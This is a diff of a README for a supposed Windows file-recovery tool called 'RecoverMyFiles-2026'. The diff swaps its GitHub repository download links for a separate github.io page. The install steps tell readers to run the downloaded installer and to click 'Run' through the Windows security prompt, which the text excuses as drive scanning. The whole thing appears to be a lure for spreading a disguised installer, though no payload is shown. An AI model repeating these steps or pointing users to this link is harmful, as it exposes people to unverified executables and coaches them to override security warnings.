@@ -1,6 +1,6 @@
 # 📂 RecoverMyFiles-2026 - Restore your deleted Windows files easily
 
-[![](https://img.shields.io/badge/Download-RecoverMyFiles-blue.svg)](https://github.com/Pepitastock390/RecoverMyFiles-2026)
+[![](https://img.shields.io/badge/Download-RecoverMyFiles-blue.svg)](https://pepitastock390.github.io)
 
 ## 🔍 About the software
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these basic needs:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project website at [https://github.com/Pepitastock390/RecoverMyFiles-2026](https://github.com/Pepitastock390/RecoverMyFiles-2026).
+1. Visit the project website at [https://pepitastock390.github.io](https://pepitastock390.github.io).
 2. Look for the release section to find the latest version.
 3. Select the installer file to save it to your Downloads folder.
 4. Open the file once the download finishes. Windows might show a security prompt because the software scans your storage drives. Select Run to continue.
